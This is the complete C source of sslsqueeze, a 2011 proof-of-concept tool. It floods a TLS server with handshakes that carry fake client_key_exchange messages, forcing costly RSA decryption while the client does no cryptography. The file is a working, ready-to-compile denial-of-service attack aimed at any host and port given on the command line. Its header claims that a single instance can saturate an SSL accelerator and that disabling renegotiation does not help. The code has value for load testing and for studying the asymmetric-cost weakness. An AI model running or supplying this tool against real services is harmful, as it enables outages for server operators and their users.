/*
 * sslsqueeze 1.0 SSL service load generator proof of concept
 * Copyright (C) 2011 Michal Trojnara <Michal.Trojnara@mirt.net>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful, but
 * WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 * See the GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, see <http://www.gnu.org/licenses>.
 */

/*
 * sslsqueeze needs to be linked with -levent_core from libevent2 library.
 * sslsqueeze does *not* use or require:
 *  - Client-side cryptography,
 *  - Threads,
 *  - SSL session renegotiation.
 * As the result single sslsqueeze can saturate a fast SSL accelerator.
 * Disabling session renegotiation is also not an effective mitigation.
 */

/*
 * This work dedicated to Google Security Engineering team in Zurich.
 * You guys tried hard to find out whether I understand this stuff. 8-)
 */

#ifdef _WIN32
#define FD_SETSIZE 4096
#define __USE_W32_SOCKETS
#define _WIN32_WINNT 0x0501
#include <ws2tcpip.h>
#else
#include <sys/socket.h>
#include <netdb.h>
#endif
#include <event2/event.h>
#include <event2/bufferevent.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <stddef.h>
#include <time.h>

#define MAX_FRAG 65536

typedef unsigned char byte;
typedef struct {
    byte type;
    byte version[2];
    byte length[2];
} record;

static struct event_base *base;
static struct sockaddr *addr;
static int addr_len;
struct {
    record rec;                             /* type 22 (handshake) */
    struct {
        byte type;                          /* 1 for client_hello */
        byte length[3];                     /* htons(sizeof client_hello) */
        struct {
            byte version[2];                /* 3.0 */
            byte random_data[32];
            byte session_id_length[1];      /* 0 */
            byte cipher_suite_length[2];    /* htons(cipher_suite_list) */
            byte cipher_suite_list[6];      /* some popular RSA-based ciphersuites */
            byte compression_length[1];     /* 1 */
            byte compression_list[1];
        } client_hello;
    } fragment;
} r1;
struct {
    record rec;                             /* type 22 (handshake) */
    struct client_key_exchange_fragment {
        byte type;                          /* 16 for client_key_exchange */
        byte length[3];                     /* htons(sizeof client_key_exchange) */
        byte client_key_exchange[512];      /* space for 2048 bits */
    } fragment;
} r2;
struct {
    record rec;                             /* type 20 (change_cipher_spec) */
    struct {
        byte type;                          /* 1 */
    } fragment;
} r3;
struct {
    record rec;                             /* type 22 (handshake) */
    byte fragment[0x50];                    /* finished */
} r4;
typedef struct {
    union {
        record rec;
        byte frag[MAX_FRAG];
    } buff;
    int mode, rec_type, ptr, len;
} state;

static void setup_record(record *, const byte, const u_short);
static void setup_record2(record *, const byte, const u_short);
static u_short rec_len(const record *);
static void read_cb(struct bufferevent *, void *);
static void write_cb(struct bufferevent *, void *);
static void event_cb(struct bufferevent *, short, void *);
static void new_connection(state *);
static void statistics(const int);

int main(int argc, char *argv[]) {
    int i, clients, keysize, error;
    struct addrinfo *result;
#ifdef _WIN32
    static struct WSAData wsa_state;
#endif
    char ip[40], port[6];

    if(argc<5) {
        fprintf(stderr, "Usage:\n\t%s host port keysize numclients\n", argv[0]);
        fprintf(stderr, "Example:\n\t%s localhost 443 1024 100\n", argv[0]);
        fprintf(stderr, "Key size can be retrieved with:\n");
        fprintf(stderr, "\topenssl s_client -connect host:port");
        fprintf(stderr, " </dev/zero 2>&1 |grep '^Server public key is '\n");
        return 1;
    }
#ifdef _WIN32
    WSAStartup(MAKEWORD(2, 2), &wsa_state);
#endif
    error=getaddrinfo(argv[1], argv[2], NULL, &result);
    if(error) {
        fprintf(stderr, "Error in getaddrinfo: %s\n", gai_strerror(error));
        return 1;
    }
    addr_len=result->ai_addrlen;
    addr=malloc(addr_len);
    memcpy(addr, result->ai_addr, addr_len);
    freeaddrinfo(result);

    keysize=atoi(argv[3]);
    if(keysize<1 || keysize>4096) {
        fprintf(stderr, "Keysize is usually either 1024 or 2048\n");
        return 1;
    }
    keysize=(keysize+7)/8; /* convert to number of bytes */

    clients=atoi(argv[4]);
    if(clients<1 || clients>50000) {
        fprintf(stderr, "Number of clients should be a number between 1 and 1000\n");
        return 1;
    }

    error=getnameinfo(addr, addr_len, ip, sizeof ip,
        port, sizeof port, NI_NUMERICHOST|NI_NUMERICSERV);
    if(error) {
        fprintf(stderr, "getnameinfo: %s", gai_strerror(error));
        return 1;
    }
    fprintf(stderr, "sslsqueeze 1.0 by Michal Trojnara 2011\n");
    fprintf(stderr, "Squeezing %s:%s\n", ip, port);

    setup_record(&r1.rec, 22, sizeof r1.fragment); /* handshake */
    r1.fragment.type=1; /* client_hello */
    r1.fragment.length[0]=0;
    r1.fragment.length[1]=sizeof r1.fragment.client_hello>>8;
    r1.fragment.length[2]=sizeof r1.fragment.client_hello&0xff;
    r1.fragment.client_hello.version[0]=3;
    r1.fragment.client_hello.version[1]=3;
    r1.fragment.client_hello.session_id_length[0]=0;
    r1.fragment.client_hello.cipher_suite_length[0]=0;
    r1.fragment.client_hello.cipher_suite_length[1]=sizeof r1.fragment.client_hello.cipher_suite_list;
    r1.fragment.client_hello.cipher_suite_list[0]=0x00;
    r1.fragment.client_hello.cipher_suite_list[1]=0x0a; /* SSL_RSA_WITH_3DES_EDE_CBC_SHA */
    r1.fragment.client_hello.cipher_suite_list[2]=0x00;
    r1.fragment.client_hello.cipher_suite_list[3]=0x04; /* SSL_RSA_WITH_RC4_128_MD5 */
    r1.fragment.client_hello.cipher_suite_list[4]=0x00;
    //r1.fragment.client_hello.cipher_suite_list[5]=0x2f; /* TLS_RSA_WITH_AES_128_CBC_SHA */
    r1.fragment.client_hello.cipher_suite_list[5]=0x9d; /* TLS_RSA_AES256-GCM-SHA384 */
    r1.fragment.client_hello.compression_length[0]=sizeof r1.fragment.client_hello.compression_list;
    r1.fragment.client_hello.compression_list[0]=0;

    setup_record2(&r2.rec, 22, offsetof(struct client_key_exchange_fragment, client_key_exchange)+keysize); /* handshake */
    r2.fragment.type=16; /* client_key_exchange */
    r2.fragment.length[0]=0;
    r2.fragment.length[1]=keysize>>8;
    r2.fragment.length[2]=keysize&0xff;
#if 0
    for(i=0; i<sizeof r2.fragment.client_key_exchange; ++i)
        r2.fragment.client_key_exchange[i]=random();
#endif

    setup_record2(&r3.rec, 20, sizeof r3.fragment); /* change_cipher_spec */
    r3.fragment.type=1;

    setup_record2(&r4.rec, 22, sizeof r4.fragment); /* handshake */

    base=event_base_new();
    for(i=0; i<clients; ++i)
        new_connection(malloc(sizeof(state)));
    event_base_dispatch(base);
    return 0;
}

static void setup_record(record *rec, const byte type, const u_short size) {
    rec->type=type;
    rec->version[0]=3;
    rec->version[1]=1;
    rec->length[0]=size>>8;
    rec->length[1]=size&0xff;
}

static void setup_record2(record *rec, const byte type, const u_short size) {
    rec->type=type;
    rec->version[0]=3;
    rec->version[1]=3;
    rec->length[0]=size>>8;
    rec->length[1]=size&0xff;
}

static u_short rec_len(const record *rec) {
    return rec->length[0]<<8 | rec->length[1];
}

static void read_cb(struct bufferevent *bev, void *ctx) {
    state *s=(state *)ctx;
    int received, error=1;

    for(;;) {
        received=bufferevent_read(bev, s->buff.frag+s->ptr, s->len);
        if(received<=0) /* no data buffered */
            return;
        s->ptr+=received;
        s->len-=received;
        if(s->len) /* not enough data buffered */
            return;
        s->ptr=0;
        s->mode^=1;
        if(s->mode) { /* finished reading record header */
            s->len=rec_len(&s->buff.rec);
            if(s->len<1 || s->len>MAX_FRAG)
                break;
            s->rec_type=s->buff.rec.type;
        } else { /* finished reading record fragment */
            s->len=sizeof(record);
            if(s->rec_type==22 && s->buff.frag[0]==2) {
                /* handshake message type 2 (server_hello) */
                bufferevent_write(bev, &r2, rec_len(&r2.rec)+sizeof(record));
                bufferevent_write(bev, &r3, rec_len(&r3.rec)+sizeof(record));
                bufferevent_write(bev, &r4, rec_len(&r4.rec)+sizeof(record));
            }
            if(s->rec_type==21 && s->buff.frag[0]==2 && s->buff.frag[1]==20) {
                error=0; /* fatal alert 20 (bad_record_mac) */
                break;
            }
        }
    }
    bufferevent_free(bev);
    new_connection(ctx);
    statistics(error);
}

static void write_cb(struct bufferevent *bev, void *ctx) {
    bufferevent_enable(bev, EV_READ);
}

static void event_cb(struct bufferevent *bev, short events, void *ctx) {
    if(events&BEV_EVENT_CONNECTED) {
        bufferevent_write(bev, &r1, rec_len(&r1.rec)+sizeof(record));
        return;
    }
    bufferevent_free(bev);
    new_connection(ctx);
    statistics(1);
}

static void new_connection(state *s) {
    struct bufferevent *bev;
    struct timeval timeout={3, 0}; /* 3 seconds */

    s->mode=0;
    s->ptr=0;
    s->len=sizeof(record);
    bev=bufferevent_socket_new(base, -1, BEV_OPT_CLOSE_ON_FREE);
    bufferevent_set_timeouts(bev, &timeout, &timeout);
    bufferevent_setcb(bev, read_cb, write_cb, event_cb, s);
    bufferevent_socket_connect(bev, addr, addr_len);
}

static void statistics(const int err) {
    static time_t old_time;
    time_t new_time;
    static int stats[2]={0, 0};

    ++stats[err];
    new_time=time(NULL);
    if(new_time==old_time)
        return;
    old_time=new_time;
    printf("Succeeded: %-10dFailed: %-10d\r", stats[0], stats[1]);
    fflush(stdout);
    stats[0]=stats[1]=0;
}

/* end of sslsqueeze.c */
